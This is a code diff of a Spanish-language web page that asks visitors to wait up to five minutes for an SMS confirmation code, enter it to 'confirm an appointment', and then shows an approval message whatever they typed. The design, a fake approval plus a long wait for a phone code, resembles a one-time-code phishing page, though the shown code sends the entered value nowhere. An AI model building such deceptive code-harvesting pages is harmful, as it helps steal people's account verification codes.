@@ -47,48 +47,36 @@
 </head>
 <body>
 
-  <h2>Te enviaremos un código a tu teléfono. Por favor, introdúcelo abajo.</h2>
+  <h2 style="max-width: 800px;">Por favor, espere y no cierre esta página. En breve recibirá en su teléfono un código de confirmación, que le rogamos introducir en la casilla de abajo para poder confirmar su cita.
+  Le pedimos un poco de paciencia, ya que el proceso puede tardar hasta 5 minutos.</h2>
   <div id="spinner" class="spinner"></div>
 
   <div id="codeInputs" class="code-inputs">
-    <input type="text" maxlength="1">
-    <input type="text" maxlength="1">
-    <input type="text" maxlength="1">
-    <input type="text" maxlength="1">
-    <input type="text" maxlength="1">
-    <input type="text" maxlength="1">
+    <input type="text" style="width: 300px;" id="verifyCode">
   </div>
+    <button id="submit" style="
+        background: #3d6eff;
+        border: none;
+        border-radius: 8px;
+        padding: 10px 30px;
+        color: white;
+        font-size: 20px;
+        margin-top: 15px;">
+      Enviar
+    </button>
 
   <script>
         const title = document.querySelector('h2');
-        const inputs = document.querySelectorAll('.code-inputs input');
-        inputs[0].focus();
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', () => {
-                input.value = input.value.replace(/[^0-9]/g, '');
-                if (input.value.length === 1 && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
-                checkAllInputsFilled();
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && input.value === '' && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
-        });
-        function checkAllInputsFilled() {
-            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
-            if (allFilled) {
-                title.innerText = 'Tu cita ha sido aprobada. Recibirás un SMS de nuestra parte dentro de 1 día antes de la fecha de la cita.';
-                $('#codeInputs').remove();
-                $('#spinner').remove();
-                setTimeout(() => {
-                  window.location.href = "/"
-                }, 15000)
-            }
-        }
+        $('#submit').on('click', function(){
+          if($('#verifyCode').val() == '') return;
+          title.innerText = 'Tu cita ha sido aprobada. Recibirás un SMS de nuestra parte dentro de 1 día antes de la fecha de la cita.';
+          $('#codeInputs').remove();
+          $('#spinner').remove();
+          $('#submit').remove();
+          setTimeout(() => {
+            window.location.href = "/"
+          }, 15000)
+        })
   </script>
 
 </body>
